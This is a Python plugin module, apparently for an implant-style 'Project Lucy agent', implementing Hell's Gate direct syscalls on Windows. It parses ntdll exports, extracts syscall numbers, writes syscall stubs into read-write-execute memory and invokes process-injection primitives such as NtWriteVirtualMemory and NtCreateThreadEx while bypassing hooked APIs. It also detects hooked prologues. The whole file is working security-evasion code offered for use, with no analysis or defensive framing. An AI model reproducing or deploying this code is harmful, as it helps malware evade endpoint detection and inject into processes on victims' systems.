"""
Direct syscall module for Project Lucy agent (Hell's Gate pattern).
Resolves syscall numbers from ntdll export table, builds executable
syscall stubs, and invokes them directly without going through hooked APIs.
Actions: resolve, call, list, check.
"""
import ctypes
import platform
import struct

name = "syscalls"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = []

SYSTEM = platform.system()

# Win32 constants
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000

# Target NT functions for syscall resolution
_TARGET_FUNCTIONS = [
    "NtAllocateVirtualMemory",
    "NtFreeVirtualMemory",
    "NtWriteVirtualMemory",
    "NtReadVirtualMemory",
    "NtCreateThreadEx",
    "NtProtectVirtualMemory",
    "NtOpenProcess",
    "NtClose",
    "NtQueryInformationProcess",
    "NtCreateSection",
    "NtMapViewOfSection",
    "NtUnmapViewOfSection",
]

# Resolved syscall numbers: {function_name: syscall_number}
_resolved_syscalls: dict[str, int] = {}

# Allocated syscall stubs: {function_name: ctypes function pointer}
_syscall_stubs: dict[str, ctypes.c_void_p] = {}


def _get_kernel32():
    return ctypes.windll.kernel32


def _get_ntdll():
    return ctypes.windll.ntdll


def _read_memory(address, size):
    """Read `size` bytes from `address`."""
    buf = (ctypes.c_ubyte * size)()
    ctypes.memmove(buf, address, size)
    return bytes(buf)


def _parse_ntdll_exports():
    """
    Parse the ntdll export table and return a dict of
    {function_name: rva} for all exported functions.
    """
    kernel32 = _get_kernel32()
    ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
    if not ntdll_base:
        raise ValueError("Could not get ntdll base handle")

    # DOS header -> e_lfanew
    e_lfanew = ctypes.c_uint32.from_address(ntdll_base + 0x3C).value

    # PE header
    pe_addr = ntdll_base + e_lfanew

    # Optional header starts at pe_addr + 24
    # Export directory RVA is at optional header offset 96 (PE32+) or 112 (PE32)
    # For 64-bit ntdll: magic = 0x20B, export table at offset 112
    magic = ctypes.c_ushort.from_address(pe_addr + 24).value
    if magic == 0x20B:  # PE32+
        export_dir_rva = ctypes.c_uint32.from_address(pe_addr + 24 + 112).value
    elif magic == 0x10B:  # PE32
        export_dir_rva = ctypes.c_uint32.from_address(pe_addr + 24 + 96).value
    else:
        raise ValueError(f"Unknown PE magic: 0x{magic:04X}")

    if export_dir_rva == 0:
        raise ValueError("ntdll has no export directory")

    export_dir_addr = ntdll_base + export_dir_rva

    # IMAGE_EXPORT_DIRECTORY fields
    num_functions = ctypes.c_uint32.from_address(export_dir_addr + 20).value
    num_names = ctypes.c_uint32.from_address(export_dir_addr + 24).value
    addr_functions_rva = ctypes.c_uint32.from_address(export_dir_addr + 28).value
    addr_names_rva = ctypes.c_uint32.from_address(export_dir_addr + 32).value
    addr_ordinals_rva = ctypes.c_uint32.from_address(export_dir_addr + 36).value

    addr_functions = ntdll_base + addr_functions_rva
    addr_names = ntdll_base + addr_names_rva
    addr_ordinals = ntdll_base + addr_ordinals_rva

    exports = {}
    for i in range(num_names):
        # Name RVA
        name_rva = ctypes.c_uint32.from_address(addr_names + i * 4).value
        name_addr = ntdll_base + name_rva
        # Read the name string
        func_name = ctypes.cast(name_addr, ctypes.c_char_p).value.decode("ascii")

        # Ordinal index
        ordinal = ctypes.c_ushort.from_address(addr_ordinals + i * 2).value
        # Function RVA
        func_rva = ctypes.c_uint32.from_address(addr_functions + ordinal * 4).value
        exports[func_name] = func_rva

    return ntdll_base, exports


def _extract_ssn(ntdll_base, func_rva):
    """
    Extract the syscall service number (SSN) from a function prologue.
    Expected pattern:  mov r10, rcx   (4C 8B D1)
                       mov eax, SSN   (B8 xx xx 00 00)
    The SSN is the dword at offset +4 from the function start.
    """
    func_addr = ntdll_base + func_rva
    # Read first 8 bytes of the function
    prologue = _read_memory(func_addr, 8)

    # Check for the standard syscall prologue:
    #   4C 8B D1          mov r10, rcx
    #   B8 xx xx 00 00    mov eax, <SSN>
    if len(prologue) >= 8 and prologue[0:3] == b"\x4c\x8b\xd1" and prologue[3] == 0xB8:
        ssn = struct.unpack_from("<I", prologue, 4)[0]
        return ssn

    # Fallback: scan for B8 (mov eax, imm32) in first 16 bytes
    prologue_ext = _read_memory(func_addr, 16)
    for i in range(len(prologue_ext) - 5):
        if prologue_ext[i] == 0xB8:
            ssn = struct.unpack_from("<I", prologue_ext, i + 1)[0]
            if ssn < 0x1000:  # sanity check
                return ssn

    return None


def _resolve_syscalls() -> dict:
    """Resolve syscall numbers for all target NT functions."""
    global _resolved_syscalls

    try:
        ntdll_base, exports = _parse_ntdll_exports()
    except Exception as exc:
        return {"status": "failed", "error": f"Failed to parse ntdll exports: {exc}"}

    resolved = {}
    failed = []

    for func_name in _TARGET_FUNCTIONS:
        if func_name not in exports:
            failed.append(func_name)
            continue

        ssn = _extract_ssn(ntdll_base, exports[func_name])
        if ssn is not None:
            resolved[func_name] = ssn
            _resolved_syscalls[func_name] = ssn
        else:
            failed.append(func_name)

    return {
        "status": "completed",
        "data": {
            "resolved": resolved,
            "resolved_count": len(resolved),
            "failed": failed,
            "failed_count": len(failed),
        },
    }


def _build_syscall_stub(ssn):
    """
    Build a syscall stub in executable memory:
        mov r10, rcx     ; 4C 8B D1
        mov eax, <SSN>   ; B8 xx xx 00 00
        syscall           ; 0F 05
        ret               ; C3
    Returns a ctypes function pointer.
    """
    kernel32 = _get_kernel32()

    stub_bytes = b"\x4c\x8b\xd1"  # mov r10, rcx
    stub_bytes += b"\xb8" + struct.pack("<I", ssn)  # mov eax, SSN
    stub_bytes += b"\x0f\x05"  # syscall
    stub_bytes += b"\xc3"  # ret

    # Allocate executable memory
    addr = kernel32.VirtualAlloc(
        None,
        len(stub_bytes),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    )
    if not addr:
        raise ctypes.WinError(ctypes.get_last_error())

    # Write the stub
    buf = (ctypes.c_ubyte * len(stub_bytes))(*stub_bytes)
    ctypes.memmove(addr, buf, len(stub_bytes))

    return addr


def _call_syscall(func_name, args) -> dict:
    """Execute a direct syscall by name with the provided arguments."""
    global _syscall_stubs

    if func_name not in _resolved_syscalls:
        # Try to resolve on the fly
        result = _resolve_syscalls()
        if func_name not in _resolved_syscalls:
            return {"status": "failed", "error": f"Syscall not resolved: {func_name}"}

    ssn = _resolved_syscalls[func_name]

    try:
        # Build or reuse stub
        if func_name not in _syscall_stubs:
            stub_addr = _build_syscall_stub(ssn)
            _syscall_stubs[func_name] = stub_addr
        else:
            stub_addr = _syscall_stubs[func_name]

        # Convert args to ctypes values
        # NT functions use the Win32 calling convention (RCX, RDX, R8, R9, stack)
        # We use ctypes to call the stub as a generic function
        c_args = []
        for arg in args:
            if isinstance(arg, int):
                c_args.append(ctypes.c_void_p(arg))
            elif isinstance(arg, str):
                c_args.append(ctypes.c_char_p(arg.encode("ascii")))
            elif isinstance(arg, bytes):
                c_args.append(ctypes.c_char_p(arg))
            else:
                c_args.append(arg)

        # Define the function prototype dynamically
        # All NT syscalls return NTSTATUS (LONG)
        func_type = ctypes.CFUNCTYPE(ctypes.c_long, *([ctypes.c_void_p] * len(c_args)))
        func = func_type(stub_addr)

        status = func(*c_args)

        return {
            "status": "completed",
            "data": {
                "function": func_name,
                "ssn": ssn,
                "ntstatus": f"0x{status & 0xFFFFFFFF:08X}",
                "success": status >= 0,
                "args_count": len(c_args),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Syscall call failed: {exc}"}


def _list_syscalls() -> dict:
    """List all resolved syscall numbers."""
    return {
        "status": "completed",
        "data": {
            "syscalls": dict(_resolved_syscalls),
            "count": len(_resolved_syscalls),
        },
    }


def _check_syscalls() -> dict:
    """Verify syscall numbers by checking prologue patterns."""
    try:
        ntdll_base, exports = _parse_ntdll_exports()
    except Exception as exc:
        return {"status": "failed", "error": f"Failed to parse ntdll exports: {exc}"}

    verified = {}
    suspicious = []

    for func_name, ssn in _resolved_syscalls.items():
        if func_name not in exports:
            suspicious.append({"function": func_name, "reason": "not in exports"})
            continue

        func_addr = ntdll_base + exports[func_name]
        prologue = _read_memory(func_addr, 8)

        # Check if prologue is intact (not hooked)
        if prologue[0:3] == b"\x4c\x8b\xd1" and prologue[3] == 0xB8:
            actual_ssn = struct.unpack_from("<I", prologue, 4)[0]
            if actual_ssn == ssn:
                verified[func_name] = {"ssn": ssn, "valid": True}
            else:
                suspicious.append({
                    "function": func_name,
                    "stored_ssn": ssn,
                    "actual_ssn": actual_ssn,
                    "reason": "SSN mismatch",
                })
        else:
            # Function may be hooked — SSN was likely resolved via fallback scan
            verified[func_name] = {
                "ssn": ssn,
                "valid": True,
                "note": "prologue hooked, SSN from scan",
            }

    return {
        "status": "completed",
        "data": {
            "verified": verified,
            "verified_count": len(verified),
            "suspicious": suspicious,
            "suspicious_count": len(suspicious),
        },
    }


def run(action: str = "list", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only"}

    try:
        if action == "resolve":
            return _resolve_syscalls()
        elif action == "call":
            func_name = params.get("function") or params.get("name")
            if not func_name:
                return {"status": "failed", "error": "Missing 'function' parameter"}
            args = params.get("args", [])
            if not isinstance(args, list):
                args = [args]
            return _call_syscall(func_name, args)
        elif action == "list":
            return _list_syscalls()
        elif action == "check":
            return _check_syscalls()
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
